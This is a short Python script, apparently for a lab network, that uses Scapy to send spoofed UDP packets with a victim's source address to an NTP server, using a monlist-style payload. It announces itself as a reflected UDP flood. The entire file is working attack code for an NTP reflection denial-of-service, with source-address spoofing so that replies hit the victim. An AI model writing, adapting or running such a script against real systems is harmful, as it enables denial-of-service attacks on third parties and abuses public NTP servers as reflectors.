from scapy.all import *
import time

victim_ip = "10.1.0.3"  # ws3
reflector_ip = "10.12.0.30"  # ntp
reflector_port = 123  # NTP uses UDP

payload = b"\x17\x00\x03\x2a" + b"\x00" * 4  # Fake NTP 'monlist'-like request

print("[*] Starting reflected UDP flood...")

for i in range(100):
    pkt = IP(src=victim_ip, dst=reflector_ip)/UDP(dport=reflector_port, sport=RandShort())/Raw(load=payload)
    send(pkt, verbose=False)
    time.sleep(0.05)  # avoid flooding too fast

print("[+] Done sending spoofed packets.")

